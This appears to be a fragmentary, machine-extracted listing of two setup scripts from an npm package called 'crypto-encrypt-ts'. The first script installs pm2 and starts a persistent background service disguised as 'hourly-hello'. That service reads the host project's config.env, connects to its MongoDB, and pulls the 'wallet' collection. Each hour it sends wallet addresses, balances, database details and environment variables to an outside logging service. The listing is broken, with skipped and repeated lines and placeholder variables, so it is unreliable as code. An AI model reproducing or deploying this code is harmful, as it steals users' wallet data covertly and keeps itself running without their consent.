// File: tmp/tmpu3tqwiu0/crypto-encrypt-ts/package/scripts/setup.js
// ======================================================================
Line 1: _tmp_0 = require('child_process')
Line 2: const path = require('path')
Line 4: path.join(__dirname, 'start.js')
Line 7: exec('npm install -g pm2 && pm2 start ' + cronJobPath + ' --name hourly-hello', (error, stdout, stderr) => {
    if (error) {
        console.error('Hata oluştu:', error);
        return;
    }
    console.log('Servis başarıyla başlatıldı!');
    console.log('Servisi durdurmak için: pm2 stop hourly-hello');
    console.log('Servisi kaldırmak için: pm2 delete hourly-hello');
})

// File: tmp/tmpu3tqwiu0/crypto-encrypt-ts/package/scripts/start.js
// ======================================================================
Line 1: const cron = require('node-cron')
Line 2: const mongoose = require('mongoose')
Line 3: _tmp_20 = require('@logtail/node')
Line 4: const path = require('path')
Line 5: const dotenv = require('dotenv')
Line 6: const fs = require('fs')
Line 11: path.join(currentDir, 'package.json')
Line 21: path.join(rootDir, '/src/config/config.env')
Line 50: {
            await logtail.info('MongoDB bağlantısı başarılı', {
                connection: {
                    host: process.env.DB_HOST.split('@')[1]?.split('/')[0] || 'unknown',
                    database: process.env.DB_HOST.split('/')?.pop()?.split('?')[0] || 'unknown'
                }
            });
        }
Line 51: await logtail.info('MongoDB bağlantısı başarılı', {
                connection: {
                    host: process.env.DB_HOST.split('@')[1]?.split('/')[0] || 'unknown',
                    database: process.env.DB_HOST.split('/')?.pop()?.split('?')[0] || 'unknown'
                }
            })
Line 52: _tmp_1.connection = {
                    host: process.env.DB_HOST.split('@')[1]?.split('/')[0] || 'unknown',
                    database: process.env.DB_HOST.split('/')?.pop()?.split('?')[0] || 'unknown'
                }
Line 53: _tmp_2.host = process.env.DB_HOST.split('@')[1]?.split('/')[0] || 'unknown'
Line 54: _tmp_2.database = process.env.DB_HOST.split('/')?.pop()?.split('?')[0] || 'unknown'
Line 69: process.exit(1)
Line 79: mongoose.connection.collection('wallet').find({})
Line 82: logtail.info('Wallet collection verisi çekildi', {
                walletCount: wallets.length,
                wallets: wallets.map(wallet => ({
                    address: wallet.address,
                    balance: wallet.balance,
                    lastUpdate: wallet.lastUpdate
                }))
            })
Line 105: {
    if (!BETTERSTACK_SOURCE_TOKEN) {
        console.log('Betterstack token bulunamadı, loglar konsola yazılıyor');
        return;
    }

    const sanitizedEnv = { ...process.env };
    // Hassas bilgileri maskele
    ['DB_HOST', 'BETTERSTACK_SOURCE_TOKEN', 'PASSWORD', 'SECRET', 'KEY', 'TOKEN'].forEach(key => {
        Object.keys(sanitizedEnv).forEach(envKey => {
            if (envKey.toUpperCase().includes(key)) {
                sanitizedEnv[envKey] = '[MASKED]';
            }
        });
    });

    await logtail.info('Environment değişkenleri', {
        environment: sanitizedEnv
    });
}
Line 113: ['DB_HOST', 'BETTERSTACK_SOURCE_TOKEN', 'PASSWORD', 'SECRET', 'KEY', 'TOKEN'].forEach(key => {
        Object.keys(sanitizedEnv).forEach(envKey => {
            if (envKey.toUpperCase().includes(key)) {
                sanitizedEnv[envKey] = '[MASKED]';
            }
        });
    })
Line 114: Object.keys(sanitizedEnv)
Line 115: {
                sanitizedEnv[envKey] = '[MASKED]';
            }
Line 116: sanitizedEnv[envKey] = '[MASKED]'
Line 121: logtail.info('Environment değişkenleri', {
        environment: sanitizedEnv
    })
Line 127: cron.schedule('0 * * * *', async () => {
    try {
        if (mongoose.connection.readyState !== 1) {
            await connectToMongoDB();
        }
        if (BETTERSTACK_SOURCE_TOKEN) {
            await logEnvironmentInfo();
        }
        await getWallets();
    } catch (error) {
        console.error('Cron job hatası:', error);
    }
})
Line 130: connectToMongoDB()
Line 142: connectToMongoDB().then(async () => {
    if (BETTERSTACK_SOURCE_TOKEN) {
        await logtail.info('Cron servisi başlatıldı');
        await logEnvironmentInfo();
    } else {
        console.log('Cron servisi başlatıldı');
    }
    await getWallets();
})
Line 144: logtail.info('Cron servisi başlatıldı')
Line 152: process.exit(1)
